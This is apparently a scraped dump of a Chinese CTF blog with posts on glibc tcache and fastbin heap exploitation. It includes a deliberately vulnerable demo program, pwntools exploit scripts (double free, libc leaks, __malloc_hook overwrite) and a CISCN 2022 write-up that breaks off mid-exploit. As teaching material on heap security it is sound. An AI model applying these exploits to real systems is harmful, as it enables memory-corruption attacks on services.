&#123; tcache_entry *tmp; LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr(&quot;free(): double free detected in tcache 2&quot;); &#125; if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) //通过检查，放入tcahce中 &#123; tcache_put(p, tc_idx); return; &#125; &#125; 所以 如果我们还想要使用tcache double free的话 就只能修改key字段 或者是fastbin double free 但是由于fastbin对于chunk的取出有着size域的检查 相对来说不好办 并且我们还需要填满tcache的对应链表才能把chunk释放进fastbin 好在更新同时带来了stash机制 要想明白这个机制的用处 我们先要清楚tcachebin的设计目的是什么 在多线程的情况下 plmalloc会遇到主分配区被抢占的问题 只能等待或者是申请一个非主分配区 针对这种情况 plmalloc为每个线程都涉及一个缓冲区 即tcache 而stash机制就是 如果用户申请一个0x60大小的chunk tcache里面没有的话 就会进入分配区处理 此时如果哪个bin中含有满足条件的chunk 除了分配这一次请求之外 其会认为该线程还需要更多类似大小的chunk 为了避免下次继续重复这一步骤 就会将该bin链表中的所有chunk放入到对应tcachebin的链表中 这个绕过手法存在的意义是因为高版本的tcache对于double free的检查更加严格 是对比整个链表 所以很难利用 如果我们在fastbin中构造好fake chunk 再利用这个机制 就可以继续使用tcachebinattack 话归正题 开始还是2.27中的问题 由于多了tcachebin 所以会优先进入tcachebin 我们还得先填满tcachebin中的一个链表 才能释放chunk到fastbin add(0x68,b&#x27;aaaa&#x27;)#0add(0x68,b&#x27;aaaa&#x27;)#1add(0x68,b&#x27;aaaa&#x27;)#2for i in range(7): add(0x68,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)for i in range(7): delete(i+3)delete(0)delete(1)delete(0)debug() 接着我们先把在tcache中的chunk全部申请回来 然后再构造fake fd add(0x68,b&#x27;aaaa&#x27;)#0add(0x68,b&#x27;aaaa&#x27;)#1add(0x68,b&#x27;aaaa&#x27;)#2for i in range(7): add(0x68,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)for i in range(7): delete(i+3)delete(0)delete(1)delete(0)for i in range(7): add(0x68,b&#x27;aaaa&#x27;)add(0x68,b&#x27;testtest&#x27;)debug() 在执行到最后一个add的时候 plmalloc在tcache中找不到合适的chunk 而在fastbin中找到了 所以此时就会把fastbin对应的链表转移到tcache中 如图所示 绕过key检查还可以直接绕过key的检查来实现tcache的double free 只要能修改到free chunk中的内容就好了 可以看到所谓的key检查 也就是在tcachebin中的chunk的bk域存入tcache_perthread_struct结构体的地址 也就是在堆基址处0x251大小的chunk if (__glibc_unlikely(e-&gt;key == tcache)) 回顾一下源码对double free的判断 只有key的值等于tcache的时候才会对链表中所有的chunk进行遍历 如果我们将key值改为其他 就不会进入if中 add(0x10,b&#x27;aaaa&#x27;)delete(0)payload = p64(0)*2edit(0,len(payload),payload)delete(0)debug() 如上所示 我们将已经处于tcachebin中的chunk的bk域清空 这样再次free的时候就没有触发double free 劫持tcache_perthread_struct结构体typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct;其中 TCACHE_MAX_BINS的宏定义为# define TCACHE_MAX_BINS 64 从源码定义中可以看到 tcache_perthread_struct主要由两部分构成 counts数组一共占用64字节 每个字节对应着一个链表 用来存放对应链表中存放着多少个chunk entry指针数组则是用来存储每个链表中链表头的chunk地址 一共占用8*64字节 再加上tcache_perthread_struct的chunk头的0x11字节 就是0x251字节 组成了堆基址的第一个chunk 这两个数组都能达到攻击效果 下面来演示一下 counts数组我们知道 一个tcache链表中最多存放7个chunk 如果超过这个数 就会根据size将其存放到fastbin或者是unsortedbin 而plammloc判断存放几个chunk 根据的就是count数组中对应的值 如果我们将这个值修改 然后再次释放对应的chunk 就可以不将其释放到tcachebin中 add(0x10,b&#x27;aaaa&#x27;)#0delete(0)edit(0,16,p64(0)*2)delete(0)show(0)io.recv()heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True )[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x260success(&quot;heap_addr :&quot;+hex(heap_addr)) 首先我们duoble free一个0x10大小的chunk 这样其fd域就存放着其地址 经过计算 我们就可以得到堆基址 随后利用UAF 来实现任意地址写 我们任意写的地址挑在tcache_perthread_struct结构体中 目的是为了修改counts数组 edit(0,8,p64(heap_addr+0x10)) 此时链表结构如图所示 我们再次申请两个chunk 第二个chunk就指向tcache_perthread_struct结构体 我们将对应0xa0链表的counts修改为7 add(0x10,b&#x27;aaaa&#x27;)#1payload = p64(0)+p8(7)add(0x10,payload)#2 add(0x90,b&#x27;aaaa&#x27;)#3add(0x20,b&#x27;aaaa&#x27;)#4delete(3) 随后申请一个0x90大小的chunk 对应着0xa0的链表 chunk4则是用来防止合并 释放chunk3以后 会发现 其成功进入了unsortedbin 于是我们就达到了攻击效果 entry指针数组我们先来随便释放几个不同size的chunk 来观察一下entry数组的情况 可以看到其指向的是chunk的用户地址 而非首地址 接着 我们将0x20链表的entry指针修改一下 然后再次申请0x10大小的chunk 看会分配给我们什么 add(0x10,b&#x27;aaaa&#x27;)add(0x20,b&#x27;aaaa&#x27;)add(0x30,b&#x27;aaaa&#x27;)delete(0)delete(1)delete(2)debug()add(0x10,b&#x27;aaaa&#x27;)pause() 修改的地址调整为tcache_perthread_struct结构体的实际空间首地址 可以看到 成功任意申请到了tcache_perthread_struct的空间 还有一点可以注意的 按照原本的源码逻辑 对应的地址是已经存在chunk头的 所以申请并不会重新覆写 因为在实际任意地址写的时候不用担心chunk头对地址的影响 mp_.tcache_bins通过覆盖mp_.tcache_bins的值 即可扩大tcachebin的容纳范围 if (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;counts[tc_idx] &gt; 0) &#123; victim = tcache_get (tc_idx); return tag_new_usable (victim); &#125; 可以看到 如果tc_idx 小于 mp_.tcache_bins的话 就会被认为是可以被释放到tcachebin中 通常适用于largebin attack配合 下面是索引方式 通过计算偏移可以获得 之所以是0x40 对应的是tcache_perthread_struct中entry数组的指针数 不过将其修改后 释放超过原本大小的chunk进入tcache 并不会被pwndbg调试捕捉到 因为原本的entry数组并没有空间供超范围的chunk使用 其作用不单单可以运用于使大chunk也能释放进入tcachebin 还可以做到任意写的效果 正常情况下 一个chunk被释放进入tcachebin 其指针会保存在tcache_perthread_struct中entry数组 如果利用上面提到的方法 使得更大的chunk被释放到tcachebin中呢 那么原本的entry数组显然没有空间 于是就会顺着高地址扩展 如果size足够大 就会扩张到高地址处的chunk中 从而这个指针就被我们掌握了 (如果有编辑堆块的办法) 于是就达到了任意写的作用 比如下面 扩大mp_.tcache_bins的值 并且释放一个0x500的chunk进入tcachebin 此时这个chunk的entry就会顺着偏移 跑到被我们控制的chunk(物理相邻tcache_perthread_struct) 如果我们修改这个entry 使其为我们要任意写的地址 再次申请对应大小的chunk 就可以达到任意写的目的 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"fastbinattack","slug":"fastbinattack","date":"2023-02-23T08:43:19.000Z","updated":"2023-09-14T17:19:00.000Z","comments":true,"path":"2023/02/23/fastbinattack/","link":"","permalink":"http://example.com/2023/02/23/fastbinattack/","excerpt":"","text":"前言很久没继续写堆部分的博客了 大部分的时间都花在重复性的刷题来掌握牢固低版本glibc的漏洞 换句话说这段时间一点进步也没有233 今天突然想起来许久没有更了 那就直接步入正题 演示程序源码我自己写的 想复现的可以自行编译 #include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int chunk_time =0;int chunk_size[50];char *chunk_ptr[50];void init()&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0);&#125;void menu()&#123; puts(&quot;Life is fucking movie&quot;); puts(&quot;Life is always full of unhappiness, like this question&quot;); puts(&quot;Anyway, what&#x27;s your answer&quot;); puts(&quot;&gt;&quot;);&#125;void add()&#123; int index; char size[20]; puts(&quot;What do you really want?&quot;); if(chunk_time&lt;=32&amp;&amp;chunk_time&gt;=0)&#123; if(!chunk_ptr[chunk_time])&#123; printf(&quot;This is the %dth choice in your life\\n&quot;,chunk_time); puts(&quot;You can customize the size of chunk, but what about your life&quot;); read(0,size,0x8); chunk_size[chunk_time] = atoi(size); chunk_ptr[chunk_time] = malloc(chunk_size[chunk_time]); puts(&quot;Although your life is a piece of shit, you still have the initiative, right?&quot;); read(0,chunk_ptr[chunk_time],chunk_size[chunk_time]); chunk_time++; &#125;else&#123; puts(&quot;error&quot;); exit(0); &#125; &#125;else&#123; exit(0); puts(&quot;&quot;); &#125;&#125;void delete()&#123; char data[100]; int index; puts(&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;); scanf(&quot;%d&quot;,&amp;index); free(chunk_ptr[index]);&#125;void edit()&#123; int index; puts(&quot;It&#x27;s never too late to start again. What do you regret?&quot;); scanf(&quot;%d&quot;,&amp;index); puts(&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;); read(0,chunk_size[index],0x8); puts(&quot;Come back!&quot;); read(0,chunk_ptr[index],chunk_size[index]);&#125;void show()&#123; puts(&quot;You can&#x27;t live a perfect life without making any effort&quot;); int index; scanf(&quot;%d&quot;,&amp;index); puts(chunk_ptr[index]);&#125;int main()&#123; int choice; init(); puts(&quot;This program is used to debug heap vulnerabilities&quot;); puts(&quot;write by chen&quot;); while(1)&#123; menu(); scanf(&quot;%d&quot;,&amp;choice); switch(choice)&#123; case 1: add(); break; case 2: delete(); break; case 3: edit(); break; case 4: show(); break; case 5: puts(&quot;The fog of that morning cleared, not only in the morning, but also in the fog&quot;); puts(&quot;You will be stronger next time I see you&quot;); exit(0); break; &#125; &#125;&#125; 顺便提供一下exp脚本 方便大家快速开始调试 from pwn import*io = process(&quot;./testheap&quot;)elf = ELF(&quot;./testheap&quot;)libc = ELF(&quot;./locate_libc2.23&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]def debug(): gdb.attach(io) pause()def add(size,payload): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;You can customize the size of chunk, but what about your life&quot;) io.sendline(str(size)) io.recvuntil(&quot;Although your life is a piece of shit, you still have the initiative, right?&quot;) io.send(payload)def delete(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;) io.sendline(str(index))def edit(index,size,payload): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;It&#x27;s never too late to start again. What do you regret?&quot;) io.sendline(str(index)) io.recvuntil(&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;) io.sendline(str(size)) io.recvuntil(&quot;Come back!&quot;) io.send(payload)def show(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;You can&#x27;t live a perfect life without making any effort&quot;) io.sendline(str(index)) ubuntu16.04 libc2.23fastbin的范围是0x20 - 0x80 这里的大小不是用户申请的大小 而是系统实际分配的大小 fastbin设计的初衷是为了方便小内存chunk的释放和重新分配 为了防止和相邻的chunk合并 所以位于fastbin中的free chunk的PREV_INUSE位不会被设置为0 始终为1 存放fastbin链表的是malloc_state结构体 struct malloc_state&#123; /* Serialize access. */ __libc_lock_define (, mutex); /* Flags (formerly in max_fast). */ int flags; /* Set if the fastbin chunks contain recently inserted free blocks. */ /* Note this is a bool but not all targets support atomics on booleans. */ int have_fastchunks; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; 在pwndbg中可以使用arena来查看其结构 其中可以看到fastbin一共有十个链表 但是可用的只有7个 其范围从0x20 - 0x80 并且是实际分配的chunk大小 而非用户申请的大小 fastbin为单向链表 遵循着先进后出的原则 即先进来的chunk位于链表尾 在2.23及以下的版本 glibc对于fastbin的检查是依靠于检测main_arena指向的chunk 即位于链表头的chunk 如果要释放的chunk和位于链表头的chunk是同一个 那么就会触发double free终止进程 if (SINGLE_THREAD_P) &#123; /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) malloc_printerr (&quot;double free or corruption (fasttop)&quot;); p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old); *fb = p; &#125; 如果我们直接释放两次chunk1 *** Error in &#96;.&#x2F;testheap’: double free or corruption (fasttop): 0x000055df88768010 *** 程序就被终止了 但是如果我们利用chunk2来干扰一下链表结构 如果此时我们释放chunk1后释放chunk2 此时再次释放chunk1 在第二次释放chunk1之前的链表头为chunk2 系统此时误判没有double free 那么释放chunk1后的链表结构就如图所示 在pwndbg中的表现如此 可以看到此时chunk1即位于链表头又位于链表尾 如果我们再次申请一个0x30大小的chunk 申请到的是位于链表头的chunk1 但是此时还有一个chunk1在链表中 我们此时获得了修改chunk1的fd域的能力 如果修改chunk1的fd域 此时的链表结构就会为 此时我们再次申请三个chunk 申请的第三个chunk就会分配到’testtest’处的地址 chunk以该地址为chunk的prev_size首地址 而非用户区的首地址 add(0x20,b&#x27;aaaa&#x27;)#0add(0x20,b&#x27;aaaa&#x27;)#1add(0x10,b&#x27;aaaa&#x27;)#2delete(0)delete(1)delete(0)add(0x20,p64(0x666666))#3add(0x20,b&#x27;aaaa&#x27;)#4add(0x20,b&#x27;aaaa&#x27;)#5add(0x20,b&#x27;testtest&#x27;)debug() 但是你很快就会发现 我们并不能如愿以偿申请到0x666666地址的chunk 这是因为fastbin在分配出chunk的时候对于chunk的size域还有一次检查 检查你要申请的这个chunk的大小是否在该fastbin链的大小尺寸范围内 if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; idx = fastbin_index (nb); mfastbinptr *fb = &amp;fastbin (av, idx); mchunkptr pp; victim = *fb; if (victim != NULL) &#123; if (__glibc_unlikely (misaligned_chunk (victim))) malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected 2&quot;); if (SINGLE_THREAD_P) *fb = REVEAL_PTR (victim-&gt;fd); else REMOVE_FB (fb, pp, victim); if (__glibc_likely (victim != NULL)) &#123; size_t victim_idx = fastbin_index (chunksize (victim)); if (__builtin_expect (victim_idx != idx, 0)) malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;); check_remalloced_chunk (av, victim, nb);#if USE_TCACHE /* While we&#x27;re here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL) &#123; if (__glibc_unlikely (misaligned_chunk (tc_victim))) malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected 3&quot;); if (SINGLE_THREAD_P) *fb = REVEAL_PTR (tc_victim-&gt;fd); else &#123; REMOVE_FB (fb, pp, tc_victim); if (__glibc_unlikely (tc_victim == NULL)) break; &#125; tcache_put (tc_victim, tc_idx); &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; &#125; 你可能也在其他教程或者wp中见到 我们在libc2.23的情况下 通常都是打malloc_hook 这是因为在malloc_hook-0x23处可以绕过fastbin的检测 我们来看一下 add(0x68,b&#x27;aaaa&#x27;)#0add(0x68,b&#x27;aaaa&#x27;)#1add(0x80,b&#x27;aaaa&#x27;)#2add(0x10,b&#x27;aaaa&#x27;)#3delete(2)show(2)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7fbf49537b78-0x7fbf49173000)success(&quot;libc_addr :&quot;+hex(libc_addr))malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]success(&quot;malloc_hook :&quot;+hex(malloc_hook))onegadget_addr = libc_addr + 0x4527adelete(0)delete(1)delete(0)add(0x68,p64(malloc_hook-0x23))add(0x68,b&#x27;aaaa&#x27;)add(0x68,b&#x27;aaaa&#x27;)debug() 此时malloc_hook-0x23正位于fastbin的链表上 我们跟进一下这个地址查看其内容 可以看到此时这个地址的第二个字长处正好是0x7f 由于free chunk位于的是0x70的链表 所以可以通过检查将其取出 随后我们只需要覆盖0xb+0x8的垃圾数据就能篡改malloc_hook 并且在ubuntu16中 这个地址处恒为0x7f ubuntu18.04 libc2.27（old）版本来到ubuntu18 此时新设了一个bin 名为tcachebin 这里只需要知道0x20-0x408的chunk都会优先被释放到其单向链表上 其他的我们在tcachebinattack中讲 此时fastbin的漏洞依然存在 我们仍然可以通过穿插释放一个chunk来使glibc误判 但是由于fastbin的范围被tcache覆盖 我们需要将tcache的一个链表填满 才能释放到fastbin中 不过由于tcachebin的漏洞更好利用 实际上在ubuntu18中 大部分都是使用的tcachebinattack 这里做个了解就行了 add(0x68,b&#x27;aaaa&#x27;)#0add(0x68,b&#x27;aaaa&#x27;)#1add(0x68,b&#x27;aaaa&#x27;)#2for i in range(7): add(0x68,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)for i in range(7): delete(i+3)delete(0)delete(1)delete(0) if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"ciscn历年国赛复现","slug":"ciscn历年国赛复现","date":"2023-02-22T12:33:07.000Z","updated":"2023-09-14T17:18:48.000Z","comments":true,"path":"2023/02/22/ciscn历年国赛复现/","link":"","permalink":"http://example.com/2023/02/22/ciscn%E5%8E%86%E5%B9%B4%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"备战一下今年的国赛 准备复现以往的题目来熟悉一下难度 [CISCN 2022 初赛]login_normal[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: &#x27;/home/chen/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/&#x27; 保护全开 一开始还以为是道堆题 ida进去看看 void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; char s[1032]; // [rsp+0h] [rbp-410h] BYREF unsigned __int64 v4; // [rsp+408h] [rbp-8h] v4 = __readfsqword(0x28u); buffer(); while ( 1 ) &#123; memset(s, 0, 0x400uLL); printf(&quot;&gt;&gt;&gt; &quot;); read(0, s, 0x3FFuLL); sub_FFD(s); &#125;&#125; main函数接收了s 并且作为sub_ffd的参数 跟进一下 unsigned __int64 __fastcall sub_FFD(_BYTE *a1)&#123; char *sa; // [rsp+8h] [rbp-48h] char *sb; // [rsp+8h] [rbp-48h] char *sc; // [rsp+8h] [rbp-48h] char *sd; // [rsp+8h] [rbp-48h] char v7; // [rsp+17h] [rbp-39h] int v8; // [rsp+1Ch] [rbp-34h] int v9; // [rsp+2Ch] [rbp-24h] void *dest; // [rsp+30h] [rbp-20h] char *s1; // [rsp+38h] [rbp-18h] char *nptr; // [rsp+40h] [rbp-10h] unsigned __int64 v13; // [rsp+48h] [rbp-8h] v13 = __readfsqword(0x28u); memset(bss_array, 0, sizeof(bss_array)); v8 = 0; v7 = 0; dest = 0LL; while ( !*a1 || *a1 != &#x27;\\n&#x27; &amp;&amp; (*a1 != &#x27;\\r&#x27; || a1[1] != 10) ) &#123; if ( v8 &lt;= 5 ) bss_array[2 * v8] = a1; sb = strchr(a1, &#x27;:&#x27;); if ( !sb ) &#123; puts(&quot;error.&quot;); exit(1); &#125; *sb = 0; for ( sc = sb + 1; *sc &amp;&amp; (*sc == &#x27; &#x27; || *sc == &#x27;\\r&#x27; || *sc == &#x27;\\n&#x27; || *sc == &#x27;\\t&#x27;); ++sc ) *sc = 0; if ( !*sc ) &#123; puts(&quot;abort.&quot;); exit(2); &#125; if ( v8 &lt;= 5 ) bss_array[2 * v8 + 1] = sc; sd = strchr(sc, &#x27;\\n&#x27;); if ( !sd ) &#123; puts(&quot;error.&quot;); exit(3); &#125; *sd = 0; a1 = sd + 1; if ( *a1 == &#x27;\\r&#x27; ) *a1++ = 0; s1 = bss_array[2 * v8]; nptr = bss_array[2 * v8 + 1]; if ( !strcasecmp(s1, &quot;opt&quot;) ) &#123; if ( v7 ) &#123; puts(&quot;error.&quot;); exit(5); &#125; v7 = atoi(nptr); &#125; else &#123; if ( strcasecmp(s1, &quot;msg&quot;) ) &#123; puts(&quot;error.&quot;); exit(4); &#125; if ( strlen(nptr) &lt;= 1 ) &#123; puts(&quot;error.&quot;); exit(5); &#125; v9 = strlen(nptr) - 1; if ( dest ) &#123; puts(&quot;error.&quot;); exit(5); &#125; dest = calloc(v9 + 8, 1uLL); if ( v9 &lt;= 0 ) &#123; puts(&quot;error.&quot;); exit(5); &#125; memcpy(dest, nptr, v9); &#125; ++v8; &#125; *a1 = 0; sa = a1 + 1; if ( *sa == &#x27;\\n&#x27; ) *sa = 0; switch ( v7 ) &#123; case 2: sub_DA8(dest); break; case 3: sub_EFE(dest); break; case 1: sub_CBD(dest); break; default: puts(&quot;error.&quot;); exit(6); &#125; return __readfsqword(0x28u) ^ v13;&#125; 很长的一串代码 我们需要先代码审计看一下这串代码目的是什么 v13 = __readfsqword(0x28u);memset(bss_array, 0, sizeof(bss_array));v8 = 0;v7 = 0;dest = 0LL; 对于几个变量进行了初始化 while ( !*a1 || *a1 != &#x27;\\n&#x27; &amp;&amp; (*a1 != &#x27;\\r&#x27; || a1[1] != 10) ) 当a1为\\x00 \\n \\r 时跳出while循环 接着我们来分析一下while中的内容 if ( v8 &lt;= 5 ) bss_array[2 * v8] = a1; sb = strchr(a1, &#x27;:&#x27;); if ( !sb ) &#123; puts(&quot;error.&quot;); exit(1); &#125; *sb = 0; 首先是第一个判断 v8在while的末尾进行了一个自增运算 是用来限制执行次数的 那么这个while循环最多只能循环六次 接着在bss段上的一个全局数组存入a1 即我们在main函数中输入的s字符串 利用strchr函数查找了a1中’:’的位置 如果没有查找到的话就进入if循环 exit退出 同时将对应的’:’清零 for ( sc = sb + 1; *sc &amp;&amp; (*sc == &#x27; &#x27; || *sc == &#x27;\\r&#x27; || *sc == &#x27;\\n&#x27; || *sc == &#x27;\\t&#x27;); ++sc ) *sc = 0; if ( !*sc ) &#123; puts(&quot;abort.&quot;); exit(2); &#125; 第二次判断 先进行了一个for循环 sc指向’:’的下一个字节处 for循环的执行顺序为 先赋值再判断 最后进入循环内 而循环的内容是清零对应地址指向的内容 看到下面的if判断 显然不是我们想要的结果 所以想办法绕过for循环 那就使得’:’后的一个字节为’ ‘、’\\r’、’\\n’、’\\t’ if ( v8 &lt;= 5 ) bss_array[2 * v8 + 1] = sc; sd = strchr(sc, &#x27;\\n&#x27;); if ( !sd ) &#123; puts(&quot;error.&quot;); exit(3); &#125;*sd = 0; 第三个判断 要求字符串中有\\n 所以上面的判断我们填入的应该是\\n a1 = sd + 1; if ( *a1 == &#x27;\\r&#x27; ) *a1++ = 0; s1 = bss_array[2 * v8]; nptr = bss_array[2 * v8 + 1]; a1为’\\n’后的下一个字节处 如果a1为\\r 那么其下一个字长处为0 此时将s1和nptr赋值为bss_array 我们回溯一下上面 可以发现在最开始和第三次判断之前进行了赋值 bss_array[2 * v8] = a1;bss_array[2 * v8 + 1] = sc; 最开始的a1并没有任何的修改 所以此时的s1应该为最开始我们输入的s字符串中’:’前面的字符串 而sc为’:’后面的字符串 不过由于在第三次判断时 使sd的值为0 sd为sc字符串中’\\n’的 所以sc只剩下’:’后除’\\n’字符串了 if ( !strcasecmp(s1, &quot;opt&quot;) ) &#123; if ( v7 ) &#123; puts(&quot;error.&quot;); exit(5); &#125; v7 = atoi(nptr); &#125; else &#123; if ( strcasecmp(s1, &quot;msg&quot;) ) &#123; puts(&quot;error.&quot;); exit(4); &#125; if ( strlen(nptr) &lt;= 1 ) &#123; puts(&quot;error.&quot;); exit(5); &#125; v9 = strlen(nptr) - 1; if ( dest ) &#123; puts(&quot;error.&quot;); exit(5); &#125; dest = calloc(v9 + 8, 1uLL); if ( v9 &lt;= 0 ) &#123; puts(&quot;error.&quot;); exit(5); &#125; memcpy(dest, nptr, v9); &#125; ++v8; &#125; 接着来看这个if判断式 如果s1等于’opt’就进入if 否则进入else if中将nptr的值赋值给了v7 else中计算了nptr的长度 并且减去1后赋值给了v9 最后申请了一块堆空间 将nptr以v9个字节读入到dest中 *a1 = 0; sa = a1 + 1; if ( *sa == &#x27;\\n&#x27; ) *sa = 0; switch ( v7 ) &#123; case 2: sub_DA8(dest); break; case 3: sub_EFE(dest); break; case 1: sub_CBD(dest); break; default: puts(&quot;error.&quot;); exit(6); &#125; 最后一个部分 清空了a1的值 sa指向a1字符串的末尾 如果有换行符赋值为0 最后进行一个switch选择分支 参数为v7 根据v7的值进入不同的函数 参数为dest 综上所述 我们需要构造的payload的格式应该为 opt:(v7)(x)\\n或者是msg:(dest)(x)\\n其中x是任意单字节的垃圾数据 因为需要使得v9等于dest的长度 接着跟进一下switch分支中的各个函数 unsigned __int64 __fastcall sub_CBD(const char *a1)&#123; int i; // [rsp+14h] [rbp-1Ch] unsigned __int64 v3; // [rsp+18h] [rbp-18h] v3 = __readfsqword(0x28u); for ( i = 0; i &lt; strlen(a1); ++i ) &#123; if ( !isprint(a1[i]) &amp;&amp; a1[i] != 10 ) &#123; puts(&quot;oh!&quot;); exit(-1); &#125; &#125; if ( !strcmp(a1, &quot;ro0t&quot;) ) &#123; unk_202028 = 1; unk_202024 = 1; &#125; else &#123; unk_202028 = 1; &#125; return __readfsqword(0x28u) ^ v3;&#125; for循环中对dest中的字符串进行了检查 isprintf检查字符是否可以被打印 同时&amp;&amp;关联了一个判断式 当dest中没有换行符时才能通过if判断 接着如果dest字符串的值为ro0t时 unk_202028 &#x3D; unk_202024 &#x3D; 1 否则unk_202028 &#x3D; 1 这里可能会有疑惑 之前的函数不是将dest中的\\n赋值为了0 这个0会对字符串的判断产生影响吗 #include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; char a[20]; scanf(&quot;%s&quot;,a); int b; b=strcasecmp(a,&quot;test&quot;); printf(&quot;%d&quot;,b);&#125; 这里尝试了一下 答案是不会 这里还不知道这两个bss段的全局变量值会有什么影响 接着看下一个函数 unsigned __int64 __fastcall sub_DA8(const char *a1)&#123; unsigned int v1; // eax size_t v2; // rax int i; // [rsp+14h] [rbp-2Ch] void *dest; // [rsp+18h] [rbp-28h] unsigned __int64 v6; // [rsp+28h] [rbp-18h] v6 = __readfsqword(0x28u); for ( i = 0; i &lt; strlen(a1); ++i ) &#123; if ( !isprint(a1[i]) &amp;&amp; a1[i] != 10 ) &#123; puts(&quot;oh!&quot;); exit(-1); &#125; &#125; if ( unk_202028 != 1 ) &#123; puts(&quot;oh!&quot;); exit(-1); &#125; if ( unk_202024 ) &#123; v1 = getpagesize(); dest = mmap(&amp;loc_FFE + 2, v1, 7, 34, 0, 0LL); v2 = strlen(a1); memcpy(dest, a1, v2); (dest)(); &#125; else &#123; puts(a1); &#125; return __readfsqword(0x28u) ^ v6;&#125; 开头同样是对于dest字符串进行一个检测 接着如果unk_202028不等于1就结束进程 如果unk_202024&#x3D;1就进入if分支否则进入else分支 else分支可以打印出a1 但是感觉不太好利用 还是来看看if分支 getpagesize获取了当前页的基地址 目的是为了配合mmap函数将该页的权限修改为7 即可读可写可执行 接着将a1字符串写入到这块内存空间中 最后执行 那显然是shellcode 并且还得是可见字符串shellcode 否则过不了最开始的判断 剩下一个函数就没什么好看的了 没啥作用 可见字符串shellcode要利用alpha3生成 具体的办法我相关博客有写 这里不复述 要注意的是本题的shellcode执行是call rdx 完整exp: from pwn import*from struct import packio = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,26603)#io = remote(&quot;1.14.71.254&quot;,28753)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./buu_libc_ubuntu18_64&quot;)#libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug(): gdb.attach(io) pause()shellcode = 